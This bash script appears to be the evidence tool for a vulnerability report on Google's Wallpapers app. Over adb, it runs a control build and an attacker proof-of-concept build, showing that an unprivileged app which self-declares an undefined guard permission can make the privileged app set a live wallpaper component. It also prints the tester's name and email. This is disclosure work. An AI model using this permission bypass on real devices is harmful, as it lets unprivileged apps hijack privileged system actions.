#!/usr/bin/env bash
# g-f004-evidence.sh — the whole proof in one screen, for the screenshot.
#
# run-poc.sh is the investigation tool and prints everything it knows. This
# prints only what the report claims, in the order the report claims it, so a
# reader can check the report against one or two photographs of a terminal.
#
# Nothing here is new testing. Every line is a command already in the report.
#
# Usage:
#   ANDROID_SERIAL=ZT422724JR ./scripts/g-f004-evidence.sh
#   ANDROID_SERIAL=... ./scripts/g-f004-evidence.sh <pkg/cls of a wallpaper service>
set -uo pipefail

ATT=com.cindrasec.wallpaperpoc
CTL=com.cindrasec.wallpaperctl
ACT=com.cindrasec.wallpaperpoc.MainActivity
GUARD=com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER
DEPUTY=com.google.android.apps.wallpaper
TARGET="${1:-com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}"
DEADLINE="${DEADLINE:-45}"

adb get-state >/dev/null 2>&1 || { echo "!! no device (set ANDROID_SERIAL)"; exit 1; }
dev() { adb shell "$@" 2>/dev/null </dev/null | tr -d '\r'; }
comp() { dev dumpsys wallpaper | grep -m1 '^  mWallpaperComponent=' | sed 's/^  mWallpaperComponent=//'; }

echo "G-F004  Google Wallpapers: unprivileged app chooses the live wallpaper component"
echo "tester  Md. Azmol Haque Rony <azmolhaque95@gmail.com>  IP $(curl -s --max-time 5 ifconfig.me || echo '?')"
echo "when    $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "device  $(dev getprop ro.product.model) / Android $(dev getprop ro.build.version.release) / $(adb get-serialno | tr -d '\r')"
echo "app     $DEPUTY  versionName=$(dev dumpsys package $DEPUTY | grep -m1 versionName | tr -d ' ')"
echo

echo "[1] the guard names a permission the platform does not define; my app does, at normal"
dev pm list permissions -f -g | grep -A4 "permission:$GUARD" | sed 's/^/    /'
echo

echo "[2] the call behind it is signature|privileged, the deputy has it, my app does not"
dev pm list permissions -f -g | grep -A4 'permission:android.permission.SET_WALLPAPER_COMPONENT' \
  | grep -E 'permission:|package:|protectionLevel:' | sed 's/^/    /'
printf '    %-32s holds it: ' "$DEPUTY"
dev dumpsys package $DEPUTY | grep -q 'SET_WALLPAPER_COMPONENT: granted=true' && echo yes || echo no
printf '    %-32s holds it: ' "$ATT"
dev dumpsys package $ATT | grep -q 'SET_WALLPAPER_COMPONENT: granted=true' && echo yes || echo no
echo

echo "[3] the two builds differ in that permission and nothing else"
for P in $CTL $ATT; do
  printf '    %-32s installed=%s  declares/uses the guard=%s\n' "$P" \
    "$(dev pm path $P | grep -c package:)" \
    "$(dev dumpsys package $P | grep -c DOWNLOAD_LIVE_WALLPAPER)"
done
echo

run() {   # run <label> <package>
  local label="$1" pkg="$2" before after i
  before="$(comp)"
  adb logcat -c
  adb shell am start -n "$pkg/$ACT" --es action set --es target "$TARGET" >/dev/null 2>&1
  for i in $(seq 1 "$DEADLINE"); do
    after="$(comp)"
    [ "$after" = "ComponentInfo{$TARGET}" ] && break
    sleep 1
  done
  echo "    build   $pkg"
  adb logcat -d -s WPPOC 2>/dev/null | grep -E 'held by me|asking for component' | sed 's/.*WPPOC *: */    /'
  echo "    before  $before"
  echo "    after   $after   (${i}s)"
  adb logcat -d 2>/dev/null | grep -E 'WallpaperManagerService: setWallpaperComponent name=' \
    | sed 's/.*setWallpaperComponent/    framework: setWallpaperComponent/' | head -1
  adb logcat -d 2>/dev/null | grep -cE 'Start proc .*com.google.android.apps.wallpaper.*DownloadableRestorer' \
    | sed 's/^/    receiver process started: /'
}

# The target must not already be set, or neither run proves anything.
if [ "$(comp)" = "ComponentInfo{$TARGET}" ]; then
  echo "!! $TARGET is already the wallpaper — set something else first, or both"
  echo "!! runs below would show it unchanged and prove nothing."
  exit 2
fi

echo "[4] control: same code, no permission"
run control $CTL
echo

echo "[5] attacker: same code, same request, with the self-declared permission"
run attacker $ATT
echo

FINAL="$(comp)"
echo "[6] result"
if [ "$FINAL" = "ComponentInfo{$TARGET}" ]; then
  echo "    the component an unprivileged app asked for is now the home wallpaper,"
  echo "    set by a privileged app on its behalf, while the same app without the"
  echo "    permission was refused."
else
  echo "    the attacker run did not set it either — read sections 4 and 5 above"
  echo "    before concluding anything."
fi
